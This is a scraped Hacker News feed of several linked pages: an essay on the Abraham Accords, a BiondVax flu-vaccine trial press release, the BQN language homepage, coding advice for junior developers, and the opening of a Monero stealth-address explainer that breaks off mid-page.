<p>Tuesday’s ceremony on the White House lawn formalizing the normalization of relations between Israel and the United Arab Emirates, along with an agreement for Israel and Bahrain to do the same, marks the end of the Arab-Israeli conflict. The agreements do not create a new Middle East, as some have maintained, but cement that what had arrived haltingly and in fits and starts is here to stay. The Arab-Israeli conflict was already over in practice, and the Abraham Accord put a significant stamp on a process that had been underway for years. This does not lessen that it is something to be celebrated, and it should be clear to everyone without blinders on why Israelis are rightly happy. The Abraham Accord also brings with it another significant consequence, one that is perhaps unintended, in that the end of the Arab-Israeli conflict will put the focus on the Israeli-Palestinian conflict in an unavoidable way.</p>



<p>&nbsp;The Abraham Accord is a positive development for Israel, the UAE, and Bahrain, and nobody should pretend otherwise. Like nearly everything in foreign policy, it will bring some downsides along with it, but that doesn’t alter the cost-benefit analysis. It is a true Jared Kushner accomplishment, and credit should be given where credit is due. While Kushner and the Trump team’s vision for an “ultimate deal” when they took office was clearly intended to be one between Israelis and Palestinians, the decision to recognize Jerusalem as Israel’s capital without any reciprocal gesture toward the Palestinians and – crucially – the Palestinian reaction in the aftermath very obviously shifted their focus. Their vision ultimately became one of isolating and bypassing the Palestinians in order to craft agreements between Israel and Arab states and demonstrate to the Palestinians that they would not be able to exercise a veto over Israel’s place in the region writ large. Whether you agree with this approach or not – and previous administrations did not – the Trump administration succeeded in carrying it out.&nbsp;</p>



<p>&nbsp;While the way to the agreement was paved by the UAE publicly setting forth that normalization could not coexist with annexation, the text of the agreement itself demonstrates how well the Trump administration managed to divorce the Palestinian issue from the wider regional context. The agreement does not explicitly mention the Arab Peace Initiative or the 1967 lines, does not mention annexation, does not mention two states, does not mention past UN agreements, does not mention the Palestinians themselves, and the only reference to the conflict is an open-ended commitment to “realize a negotiated solution to” it “that meets the legitimate needs and aspirations of both people, and to advance comprehensive Middle East peace, stability and prosperity.” For anyone looking to demonstrate to the Palestinians just how little they matter in this new reality, you could not come up with a clearer statement of just that.</p>



<p>&nbsp;That Israel and Arab states have been moving closer together for years due to a confluence of shared interests and a desire to benefit economically, militarily, and technologically does not mean that Kushner’s success was accidental. He was able to come up with the right set of incentives for the UAE to formalize what had been informal, and was also able to make the case that any concerns about breaking the Arab Peace Initiative approach – no normalization before an agreement with the Palestinians – would not carry any real consequences for states willing to do so. For all of the years of talk about secret relations underneath the table, things are now out in the open, and that is indeed a big deal.</p>



<p>&nbsp;But just as it is hollow to argue that the Israel-UAE deal does not matter, it is also hollow to argue that it is the only thing that matters. In the past few weeks, there has been a strange phenomenon of simultaneously embarking on a new path while turning back the clock. In the decades after Israel’s founding, its battles for survival and struggle for acceptance were collectively known as the Arab-Israeli conflict, which accurately reflected the primary threats and challenges that Israel faced. Following repeated Israeli military victories against Egypt, Syria, Jordan, and others, and the subsequent acknowledgement of Israeli military superiority and permanence in the region, the Arab-Israeli conflict transformed into the Israeli-Palestinian conflict. That conflict remains, yet many this week want to pretend that we are back in Arab-Israeli conflict territory. Acting as if peace between Israel and Gulf states, and only peace between Israel and Gulf states, was the terminal goal all along is absurd. It does not detract from the actual accomplishment to describe it accurately and put it in the wider context, or to point out that this is an important and consequential deal but not the ultimate one that President Trump initially sought.</p>



<p>&nbsp;The fact that the Israeli-Palestinian conflict is what remains means that there will be a true return to it in a more crystallized and concentrated way. For some, that will make it even easier to ignore, because left on its own and severed from the prospect of it being the gateway to normal relations with other states, it will seem even less important and relevant. For others, it will mean even greater awareness, as it will be easier to see all of the ways in which it is different from past Israeli conflicts and how it is not going to disappear one day on its own. Whether or not one wants to minimize the Israeli-Palestinian conflict’s importance, it is far harder in the wake of the Israel-UAE accord – one that does not explicitly recognize Israel as a Jewish state but does explicitly recognize Jews’ place in the region and rebuts the charge that Israeli Jews are colonialist interlopers – to maintain the posture that “they will always hate Jews and never accept Israel” and thus no deal can ever be struck. And if you argue that there is something qualitatively different about the Palestinians, it is also harder to simultaneously insist that they are not a distinct nationality and that they should be satisfied going to one of twenty two other Arab countries.</p>



<p>&nbsp;Most saliently, leaving the Arab-Israeli conflict behind while the Israeli-Palestinian conflict remains will create an ever starker contrast between a situation where Israeli actions and control do not have a direct impact on the parties across the table – such as the Emiratis and the Bahrainis – and the glaring situation with the Palestinians, where they do. This is also a Trump administration accomplishment, albeit an unintended one. When Arab states that were not directly impacted by Israeli actions in the West Bank would not engage with Israel, it was easy to criticize and point out the unfair standard involved and lump everyone together. With the Palestinians standing alone in every way, not only in how they relate to Israel but in how Israel relates to them, it is going to be ever clearer why and how the Israeli-Palestinian conflict is not the same as the Arab-Israeli conflict, why and how it cannot be reduced to economic or security interests, and why and how the Palestinians are not going to be overcome by U.S. inducements or the promise of access to Israeli benefits quite so easily.</p>
			
			
			
							
						</div>

					
					

				</div></div>]]>
            </description>
            <link>https://ottomansandzionists.com/2020/09/17/the-end-of-the-arab-israeli-conflict/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511291</guid>
            <pubDate>Thu, 17 Sep 2020 23:41:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Universal flu vaccine finishes Phase 3 trial, results expected before December]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24510293">thread link</a>) | @apsec112
<br/>
September 17, 2020 | https://www.biondvax.com/2020/07/last-of-12400-participants-completes-final-visit-in-biondvaxs-m-001-universal-flu-vaccine-pivotal-phase-3-clinical-trial/ | <a href="https://web.archive.org/web/*/https://www.biondvax.com/2020/07/last-of-12400-participants-completes-final-visit-in-biondvaxs-m-001-universal-flu-vaccine-pivotal-phase-3-clinical-trial/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>Jerusalem, Israel – July 1, 2020 – <strong>BiondVax Pharmaceuticals Ltd. (Nasdaq: BVXV)</strong> today announced that all participants in the placebo-controlled, blinded, pivotal, clinical efficacy, Phase 3 trial of BiondVax’s M‑001 universal influenza vaccine candidate have now completed their site visits. In total, over 12,400 volunteers aged 50+ (with half aged 65+) were enrolled in the trial over the past two flu seasons in 83 sites across seven European countries. The purpose of the study is to assess M-001’s ability as a standalone non-adjuvanted vaccine to provide clinical protection from circulating influenza strains as measured by reduction of influenza illness rate (as a primary endpoint) and severity (as a secondary endpoint), as well as to assess M-001’s safety.</p>
<p>Seasonal influenza annually infects approximately <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5596521/">10-20% of the world’s population</a> resulting in up to about <a href="https://www.who.int/en/news-room/fact-sheets/detail/influenza-(seasonal)">five million cases of severe illness and 650,000 deaths</a>. In addition, pandemic influenza, such as the H1N1 Swine Flu pandemic of 2009, is a constant global threat. However, current influenza vaccines, which target frequently mutating parts of the flu virus and therefore must be updated annually in the hope they will match the next flu season’s circulating strains, achieve on average only about <a href="https://www.cdc.gov/flu/vaccines-work/effectiveness-studies.htm">40% vaccine effectiveness</a> in the general population and as low as <a href="https://www.cdc.gov/flu/vaccines-work/2018-2019.html">12% in older adults</a>.</p>
<p>BiondVax’s M-001 is a single recombinant protein of highly conserved influenza epitopes. Consequently:</p>
<ul>
<li>M-001 does not need to be updated and therefore can be manufactured and distributed year-round.</li>
<li>M-001 is designed to provide protection to both existing and future seasonal A and B strains, as well as emerging pandemic strains.</li>
</ul>
<p><a href="http://www.biondvax.com/about-us/management/tamar-ben-yedidia-cso/"><strong>Dr. Tamar Ben-Yedida</strong></a>, BiondVax’s Chief Scientist, commented, “<em>We are pleased that despite the ongoing COVID-19 pandemic, and the challenge of conducting the trial across 83 sites and seven countries, thanks to all the people involved – including the CRO, investigators, and thousands of participants – we have maintained the planned timelines of our pivotal Phase 3 trial. In light of the ongoing COVID-19 pandemic, the need for improved influenza vaccines has arguably never been clearer. To better protect lives and economies, influenza vaccines must be more effective in reducing illness rates and severity. Needless to say, we are eagerly anticipating results of our trial by the end of this year.</em>”</p>
<p>Participants in the trial’s second cohort were enrolled prior to the 2019/20 flu season and monitored for influenza-like illness (ILI) symptoms throughout the flu season. Swabs samples were collected from those participants with ILI, and influenza confirmation is currently being conducted by a qualified laboratory. Analysis will continue in the coming months, and results are expected by the end of 2020.</p>
<p>As part of this Phase 3 study, cell-mediated immunogenicity markers of M-001 will be evaluated in a subset of participants. The recently completed clinical study report (CSR) of a U.S. National Institute of Allergy and Infectious Diseases (NIAID) supported Phase 2 clinical trial of M-001 concluded that, “<em><a href="http://www.biondvax.com/2020/06/nih-report-on-phase-2-clinical-trial-of-biondvaxs-m-001-universal-influenza-vaccine-candidate-concludes-both-primary-endpoints-achieved/">M-001 induced significant polyfunctional T cell responses</a>.</em>”</p>
<p>In addition to the ongoing pivotal, clinical efficacy, Phase 3 trial, equipment installation and manufacturing process scale-up in BiondVax’s pilot facility in Jerusalem are in progress. The facility has planned annual capacity of up to between 10 and 20 million doses in bulk.</p>
<p><strong>About BiondVax </strong><br>
BiondVax (NASDAQ: BVXV) is a Phase 3 clinical stage biopharmaceutical company developing a universal flu vaccine. The vaccine candidate, called M-001, is designed to provide multi-strain and multi-season protection against current and future, seasonal and pandemic influenza. BiondVax’s proprietary technology utilizes a unique combination of conserved and common influenza virus peptides intended to stimulate both arms of the immune system for a cross-protecting and long-lasting effect. In a total of seven completed Phase 1/2 and Phase 2 clinical trials enrolling 818 participants, the vaccine has been shown to be safe, well-tolerated, and immunogenic. The ongoing pivotal Phase 3 clinical trial aims to assess safety and effectiveness of M-001 in reducing flu illness and severity. For more information, please visit <a href="http://www.biondvax.com/">www.biondvax.com</a>.</p>
<p><strong>Contact Details</strong><br>
Joshua E. Phillipson<strong> | </strong>+972 8 930 2529<strong> | </strong>j.phillipson@biondvax.com</p>
<p><strong>Forward Looking Statements</strong><br>
<em>This press release contains forward-looking statements within the meaning of the Private Litigation Reform Act of 1995. Words such as “expect,” “believe,” “intend,” “plan,” “continue,” “may,” “will,” “anticipate,” and similar expressions are intended to identify forward-looking statements. These forward-looking statements reflect the management’s current views with respect to certain current and future events and are subject to various risks, uncertainties and assumptions that could cause the results to differ materially from those expected by the management of BiondVax Pharmaceuticals Ltd. Risks and uncertainties include, but are not limited to, risks relating to the COVID-19 (coronavirus) pandemic, including a risk of delay in the availability of the top line results from our pivotal clinical efficacy Phase 3 trial for M-001, the prosecution, timing and results of the ongoing Phase 2 and Phase 3 trials and any subsequent trials; timing of receipt of regulatory approval of our manufacturing facility in Jerusalem; ability to demonstrate the efficacy and safety of the vaccine; the timing of clinical trials and marketing approvals; the risk that drug development involves a lengthy and expensive process with uncertain outcome; the ability of the Company to maintain, preserve and defend its intellectual property and patents granted; whether our&nbsp; vaccine candidate will successfully advance through the clinical trial process on a timely basis, or at all, and receive approval from the U.S. Food and Drug Administration or equivalent foreign regulatory agencies; the adequacy of available cash resources and the ability to raise additional capital when needed. More detailed information about the risks and uncertainties affecting the Company is contained under the heading “Risk Factors” in our Annual Report on Form 20-F for the year ended December 31, 2019 filed with the U.S. Securities and Exchange Commission, or SEC, which is available on the SEC’s website, www.sec.gov. We undertake no obligation to revise or update any forward-looking statement for any reason.</em></p>
<p>###</p>
							</div></div>]]>
            </description>
            <link>https://www.biondvax.com/2020/07/last-of-12400-participants-completes-final-visit-in-biondvaxs-m-001-universal-flu-vaccine-pivotal-phase-3-clinical-trial/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24510293</guid>
            <pubDate>Thu, 17 Sep 2020 21:41:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BQN: Finally, an APL for your flying saucer]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24510182">thread link</a>) | @todsacerdoti
<br/>
September 17, 2020 | https://mlochbaum.github.io/BQN/index.html | <a href="https://web.archive.org/web/*/https://mlochbaum.github.io/BQN/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p><em>Try it online below or <a href="https://mlochbaum.github.io/BQN/try.html">here</a>, and see <a href="https://mlochbaum.github.io/BQN/running.html">running.md</a> for more options.</em></p>

<p><strong>BQN</strong> is a new programming language in the APL lineage, which aims to remove inconsistent and burdensome aspects of the APL tradition and put the great ideas on a firmer footing. BQN is aimed at existing and aspiring APL-family programmers, and using it requires a solid understanding of functions and multidimensional arrays. However, because of its focus on providing simple, consistent, and powerful array operations, BQN should also be a good language for learning array programming and building stronger array intuition.</p>
<p>BQN maintains many of the ideas that made APL\360 revolutionary in 1966:</p>
<ul>
<li>Human-friendly <strong>infix notation</strong> with no precedence rules to remember.</li>
<li><strong>Built-in array operations</strong> handle any number of dimensions easily.</li>
<li><strong>Higher-order functions</strong> allow basic functions to be applied in more powerful ways.</li>
</ul>
<p>It incorporates concepts developed over years of APL practice:</p>
<ul>
<li>The <a href="https://mlochbaum.github.io/BQN/doc/leading.html"><strong>leading axis model</strong></a>, which allows for simpler built-in functions.</li>
<li>Trains and combinators for <strong>tacit programming</strong>.</li>
<li>Lightweight <a href="https://mlochbaum.github.io/BQN/doc/block.html"><strong>anonymous functions</strong></a> (like <a href="https://aplwiki.com/wiki/Dfn">dfns</a>).</li>
</ul>
<p>But BQN is redesigned from the ground up, with brand new ideas to make these paradigms easier to use and less likely to fail.</p>
<ul>
<li>The <a href="https://mlochbaum.github.io/BQN/doc/based.html"><strong>based array model</strong></a> makes non-arrays (called atoms) a fundamental part of the language, and removes the surprise of floating arrays and the hassle of explicit boxes. New <strong>array notation</strong> eliminates the gotchas of <a href="https://aplwiki.com/wiki/Strand_notation">stranding</a>.</li>
<li>A <a href="https://mlochbaum.github.io/BQN/doc/context.html"><strong>context-free grammar</strong></a> where a value's syntactic role is determined by its spelling makes it easier for machines and humans to understand code.</li>
<li>Oh, and it naturally leads to <a href="https://mlochbaum.github.io/BQN/doc/functional.html"><strong>first-class functions</strong></a>, a feature often missed in APL.</li>
<li>The <strong>new symbols</strong> for built-in functionality allow the syntactic role of a primitive to be distinguished at a glance, and aim to be more consistent and intuitive.</li>
</ul>
<h2 id="what-kind-of-name-is-bqn">What kind of name is "BQN"?</h2>
<p>It's three letters, that happen to match the capitals in "Big Questions Notation". You can pronounce it "bacon", but are advised to avoid this unless there's puns.</p>
<h2 id="what-does-bqn-look-like">What does BQN look like?</h2>
<p>Rather strange, most likely:</p>
<a title="Open in the REPL" target="_blank" href="https://mlochbaum.github.io/BQN/try.html#code=4oqRK2DiiJjijL3ijZ8xMuKGlTIgICMgVGhlIDEydGggRmlib25hY2NpIG51bWJlcg==&amp;run">â†—ï¸�</a><pre>    <span>âŠ‘+</span><span>`</span><span>âˆ˜</span><span>âŒ½</span><span>â�Ÿ</span><span>12</span><span>â†•</span><span>2</span>  144
</pre>
<p>For longer samples, you can <a href="https://github.com/mlochbaum/BQN/blob/master/src/c.bqn">gaze into the abyss</a> that is the self-hosted compiler, or the <a href="https://github.com/mlochbaum/BQN/blob/master/src/r.bqn">shallower but wider abyss</a> of the runtime, or take a look at the friendlier <a href="https://github.com/mlochbaum/BQN/blob/master/md.bqn">markdown processor</a> used to format and highlight documentation files. There are also <a href="https://github.com/mlochbaum/BQN/blob/master/examples/fifty.bqn">some translations</a> from <a href="https://www.jsoftware.com/papers/50/">"A History of APL in 50 Functions"</a> here.</p>
<h2 id="how-do-i-work-with-the-character-set">How do I work with the character set?</h2>
<p>I enter the special characters using a backslash prefix, so that, for example, <code><span>\z</span></code> is translated to <code><span>â¥Š</span></code> (the backslash character itself is not used by BQN). The online REPL supports this method out of the box, and this repository also has <a href="https://github.com/mlochbaum/BQN/tree/master/editors">scripts</a> to support it, along with the standard syntax highlighting and indentation, in Vim and <a href="https://kakoune.org/">Kakoune</a>. When starting out, it may be easier to use the bar above the REPL: hover over a character to see a short description, and click to insert it into the editor. Finally, on Linux <a href="https://github.com/mlochbaum/BQN/blob/master/editors/bqn">this configuration file</a> for <a href="https://en.wikipedia.org/wiki/X_keyboard_extension">XKB</a> can be used to allow typing glyphs with a modifier key system-wide.</p>
<p>Few existing monospace fonts support all the BQN characters (double-struck letters like <code><span>ð�•©</span></code> are a particular sticking point), which can cause these characters to be rendered with a fallback font and have the wrong width or look inconsistent. Two fonts modified to support BQN are available currently. This site uses a <a href="https://github.com/mlochbaum/BQN/blob/master/docs/DejaVuBQNSansMono.ttf">modified DejaVu Sans Mono</a>, and another, more playful option is <a href="https://github.com/dzaima/BQN386">BQN386</a>, based on <a href="https://abrudz.github.io/APL386/">APL386</a>.</p>
<h2 id="how-do-i-get-started">How do I get started?</h2>
<p>Read the <a href="https://mlochbaum.github.io/BQN/doc/index.html">documentation</a>!</p>
<p>BQN documentation is currently written primarily for array programmers and is not comprehensive, with aspects of the language that are shared with APL poorly documented. If you're not an array programmer, it would probably be better to start with another language, or wait a few weeks. But if you're a serious language enthusiast, the <a href="https://mlochbaum.github.io/BQN/spec/index.html">specification</a> is fairly complete and might be enough to fill the gaps in the documentation.</p>
<p>If you're an array programmer, then you're in much better shape. However, you should be aware of two key differences between BQN and existing array languages beyond just the changes of <a href="https://mlochbaum.github.io/BQN/doc/primitive.html">primitives</a>â€”if these differences don't seem important to you then you don't understand them! BQN's <a href="https://mlochbaum.github.io/BQN/doc/based.html">based array model</a> is different from both a flat array model like J and a nested one like APL2, Dyalog, or GNU APL in that it has true non-array values (plain numbers and characters) that are different from depth-0 scalars. BQN also uses <a href="https://mlochbaum.github.io/BQN/doc/context.html">syntactic roles</a> rather than dynamic type to determine how values interact, that is, what's an argument or operand and so on. This system, along with lexical closures, means BQN fully supports Lisp-style <a href="https://mlochbaum.github.io/BQN/doc/functional.html">functional programming</a>.</p>



</div>]]>
            </description>
            <link>https://mlochbaum.github.io/BQN/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24510182</guid>
            <pubDate>Thu, 17 Sep 2020 21:29:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things I wish I knew at the beginning, after 11 years of coding]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24509879">thread link</a>) | @windy-topology
<br/>
September 17, 2020 | https://www.lifetechpsych.com/lessons-for-junior-dev/ | <a href="https://web.archive.org/web/*/https://www.lifetechpsych.com/lessons-for-junior-dev/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactid="8"><p>I initially wrote this post for new coders and junior devs on Reddit and <a href="https://reddit.com/r/learnprogramming/comments/itbw45/lessons_for_beginners_and_junior_developers_after/">it blew up with over 50 awards.</a> So I’ve decided to upgrade parts of it based on people’s reactions.</p>
<p>Some of these are things I wish I knew at the beginning of my journey so I could stress less.</p>
<p>Let’s get to it.</p>
<h2>All tutorials are not created equal.</h2>
<p>Imagine yourself as a lab rat. </p>
<p>As you learn and experiment, pay attention to the kinds of tutorials that work for you. Many will not work. That’s fine. In fact, that’s exactly how experiments work until you find a solution.</p>
<p>But the moment you strike gold, stick to it, consume it voraciously and then find similar tutorials like that to continue rapid growth.</p>
<p>
  <a href="https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-8754b.jpg" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="Image of coding on a mac" title="" src="https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-f8fb9.jpg" srcset="https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-e8976.jpg 148w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-63df2.jpg 295w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-f8fb9.jpg 590w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-85e3d.jpg 885w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-d1924.jpg 1180w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-9452e.jpg 1770w,
https://www.lifetechpsych.com/static/coding-on-a-mac-8784cb962b0593b5efb51100b12ec2ed-8754b.jpg 3882w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    
&nbsp; &nbsp; <em>Photo by <a href="https://unsplash.com/@cgower">Christopher Gower</a> on <a href="https://unsplash.com/">Unsplash</a></em></p>
<p>When I started, I used to bang my head against <em>Head First Java</em>, the book. But after studying for many hours, I just wasn’t getting anywhere. Yet, everyone online said it was the best book ever. But TheNewBoston youtube tutorials did it for me back then even though people don’t recommend him anymore.</p>
<p>I wish I could say this stopped after my 1st year. </p>
<p>Fast forward 2 years down the line when I started learning algorithms and ALL the blog tutorials I followed just didn’t make sense until I watched Youtube videos on Hungarian folk dance teaching algorithms.</p>
<p>And it just clicked. </p>
<p>Since then, my approach to learning has been to <strong>learn the same thing from multiple places</strong> until I find the instructor and style that works for me.</p>
<h2>Work within fear; not against it.</h2>
<p>I’ll admit: this one is easier said than done. </p>
<p>But you have to master this if you want to last long.</p>
<p>There’s this temptation to fix your fear first before you continue to learn. Unfortunately, it doesn’t work like that.</p>
<p>In fact, you’ll spend a lot of time trying to make your fear disappear that it’ll only double your anxiety. You have to find a way – your way – to acknowledge that you’re afraid, and frankly will continue to be afraid for a long time, then work within that realization. No need to fight it.</p>
<p>Sometimes, this fear disappears as you become more proficient. </p>
<p>Other times, it vanishes for a while and comes back when you get into a new environment, work with smart people, or move to a completely new stack.</p>
<p>It’s okay.</p>
<p><strong>This <em>IS</em> the life.</strong></p>
<p>It’s a sinusoidal wave – endlessly going up and down. Don’t take it too seriously or you’ll lose yourself.</p>
<h2>You’ll forget a lot of things.</h2>
<p>Deeply understanding this will change how you learn. </p>
<p>I can’t can’t the number of times I took <em>Introduction to Python Programming</em> on Udacity, Coursera, etc and still forgot everything.</p>
<p>It’s so annoying. </p>
<p>But I’ve since learned that you’ll forget anything you learn in isolated exercises because they are stored in short term memory. Neuroscience research shows that this is just how the brain works. </p>
<p>If you don’t want to forget, test your knowledge using spaced repetitions. To do this, build projects. </p>
<p>I’ll give you a concrete example: <em>len(myList)</em> will give you the length of a list in Python. You’ll learn this in Udacity’s intro course. </p>
<p>Come back a month later and you might not remember if it’s <em>len, length( ) or myList.size( )</em>. </p>
<p>But with spaced repetition through a project, the outcome is different. For example, you work on a 2-month long Django app for new coders where you need to count multiple times the number of users, the number of exercises done, the number of chats, etc. Imagine doing this throughout the span of the project, for two months. it’s hard to forget what len( ) does.</p>
<p>This is a trivial example, but hopefully you get the idea. </p>
<p>New learners can start with simple, isolated examples. </p>
<p>But <strong>if you’re not practicing within the scope of a project that makes you use and reuse what you’ve learned, nothing is going into your long term memory</strong>; it’s all short-term. And you’ll forget.</p>
<h2>Consistency &gt; hard work.</h2>
<p>Consistency is king. </p>
<p>When you start learning,  you lay down neural pathways that make it easier to retrieve information. According to Neuroscience research, these pathways only get strong through frequency of use, not just intensity.</p>
<p>This means 30 minutes a day, for 5 days a week is way better than 2.5 hours one day, only once a week. </p>
<p>Same hours; Different impact.</p>
<p>Don’t just work hard, apply wisdom here.</p>
<h2>Talent = hidden practice.</h2>
<p>It’s easy to dismiss progress as talent.</p>
<p>My first programming class was in C++ and my classmates refused to believe I had never coded before because I was just-so-talented. </p>
<p>But what they also refused to accept was that right after class, I would spend five hours typing <em>cout &lt;&lt; “this is my first program”</em>, realize it didn’t run because I forgot a semicolon; retype it and realize it didn’t print out my statement on a new line because I didn’t add endl.</p>
<p> This deliberate practice built perceived talent.</p>
<p><strong>Talent is sexier than hustle</strong> so no one wants to hear that you worked hard and got here. Just tell me you were born this way - it’s more believable.</p>
<p>But becoming a proficient developer is like playing an instrument. </p>
<p>
  <a href="https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-e402a.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="Chart showing talent vs. hustle" title="" src="https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-fb8a0.png" srcset="https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-1a291.png 148w,
https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-2bc4a.png 295w,
https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-fb8a0.png 590w,
https://www.lifetechpsych.com/static/talent-vs-hustle-chart-123bae5a1fc3df6d4580211126653fe9-e402a.png 812w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    
&nbsp; &nbsp; <em>Talent vs. Hustle - The majority of us mostly hustle our way through it.</em></p>
<p>Only a tiny few are born talented. </p>
<p>The majority can only get as good as the amount of practice they put in. And you can immediately tell a student hasn’t been practicing the moment they sit at the keyboard.</p>
<h2>You’ll meet a**holes!</h2>
<p>Every field has its dose of horrible people. </p>
<p>No doubt.</p>
<p>But I’m not sure what it is about software dev that attracts a**holes in droves. Maybe because coding gives the feeling of having a super-power or a rare skill. If you’re a newbie, you’ll meet those who’ve been coding for years and think no one else should come in.</p>
<p>A windows developer only? You’ll meet linux fanatics that think you’re mediocre. </p>
<p>If you’re a woman, you’ll immediately be dismissed because of your gender. I know this from personal stories from colleagues over the years.</p>
<p>If you’re a minority, you’ll meet people who think you should only fetch coffee; not code. </p>
<p>If you’re coming from another field (particularly not STEM), you’ll meet people who automatically make themselves gatekeepers of the programming community. </p>
<blockquote>
<p><em>“We don’t want social scientists here; we’re purists!”</em> </p>
</blockquote>
<p>They’re online. </p>
<p>At work. </p>
<p>And sadly sometimes in your family. </p>
<p>It’s not <em>if</em> you’ll meet them, it’s <em>when</em>.</p>
<p><strong>Learn to move on.</strong></p>
<p>Things are getting better but there’s still a lot to do to educate people. </p>
<p>But don’t let this deter you. Build your resilience so you don’t quit after you meet these people. </p>
<p>And when you get to the top don’t be an a**hole!</p>
<h2>Master 1 thing.</h2>
<p>New devs tend to jump around learning a lot of things. </p>
<p>Okay, it’s not just new devs; it’s also experienced folks. </p>
<p>You learned React for one week.</p>
<p>Then Django for two weeks.</p>
<p>Laravel for three. </p>
<p><strong>Stop.</strong></p>
<p>You need to wake up and realize that the harsh truth is that you’re simply extending the time it’ll take you to truly learn anything. </p>
<blockquote>
<p><em>“If one is a master of one thing and understands one thing well, one has at the same time, insight into and understanding of many things.”</em> - Vincent Van Gogh</p>
</blockquote>
<p>Pick one thing. </p>
<p>Stick with it for a few months – ideally 6 to 12 months before you move to something else. </p>
<p>This has two benefits: </p>
<ul>
<li>You’ll go deep enough and hit critical mass that moves you towards mastery.</li>
<li>After you master one domain, you can transfer knowledge to another. Learn Flask and you can easily walk into Django. Learn React deeply, and you can quickly identify the pros and cons of Laravel within a few days. </li>
</ul>
<p>This doesn’t mean learn HTML alone for six months then only CSS for 1 year; rather, it means don’t mix up learning Django, with React, with Gaming Development, and iOS. </p>
<p>You might get a lot done in a short time.</p>
<p>But you’ll master nothing!</p>
<h2>Software dev is an ever evolving field.</h2>
<p>It’s exciting.
It’s frustrating.
It’s intimidating.</p>
<p>But if I had to, I’d do it all over again.</p>
<h2>Thanks for reading.</h2>
<p>If you enjoyed this and you’re on Twitter, <a href="https://twitter.com/LifeTechPsych/status/1306588995313438722?s=20">like and retweet this</a> to help spread the word. I know it sounds trivial but it actually really helps.</p>
<p>I’m trying out a new initiative to help new coders and junior devs feel less overwhelmed, manage imposter syndrome and learn smarter. </p>
<p>To be honest, I’m not sure what this looks like yet. But I’m putting together some resources and write-ups based on what people need the most help with. </p>
<p><strong>If you’re interested, <a href="https://ctt.ac/I1f33">let me know on Twitter</a>. If you prefer sending a direct message, <a href="https://twitter.com/LifeTechPsych">my DM is open.</a></strong></p>
<p><em>Heads Up</em> - I love research so I tend to back my advice and approach with concepts from Behavioral Psychology and Neuroscience.</p></div></div>]]>
            </description>
            <link>https://www.lifetechpsych.com/lessons-for-junior-dev/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24509879</guid>
            <pubDate>Thu, 17 Sep 2020 20:59:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Stealth Address Technology?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24509865">thread link</a>) | @crecker
<br/>
September 17, 2020 | https://serhack.me/articles/what-is-stealth-address-technology-monero/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/what-is-stealth-address-technology-monero/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://serhack.me/images/stealthaddress/0_header_800px.png" alt="Monero Stealth Address"></p><p><a href="https://getmonero.org/">Monero</a> is based on the CryptoNote protocol and utilizes the most powerful cryptographic techniques in an effort to protect the privacy of the sender, recipient, and obfuscate the amount transacted.</p><p>To protect the sender’s privacy, Ring Signatures has been implemented to prevent transaction inputs from being distinguishable from one another. Ring Confidential Transactions (RingCT), which hides transaction amounts, was implemented in block <a href="https://xmrchain.net/block/1220516">#1220516</a> during January 2017 and since September 2017, this feature became mandatory for all transactions on the Monero network. In addition to these two key cryptographic techniques that Monero utilizes to ensure the privacy of every Monero user during the transaction process, Stealth Addresses ensure the privacy of the recipient. This article will focus on how Stealth Addresses work, why they were introduced, and discuss some details not commonly known about this essential feature of Monero.</p><p>Let’s imagine that you have to buy a product on an e-commerce platform from a merchant. The payment system will return a public address, so that the payment can be sent to the merchant. In the case where you use a transparent blockchain, such as <a href="https://bitcoin.org/">Bitcoin</a> or <a href="https://ethereum.org/en/">Ethereum</a>, the link between your address and the address of the merchant is obvious. So, on transparent blockchains, a third-party from outside of the transaction has the potential to track how and where your funds are spent.</p><p><img 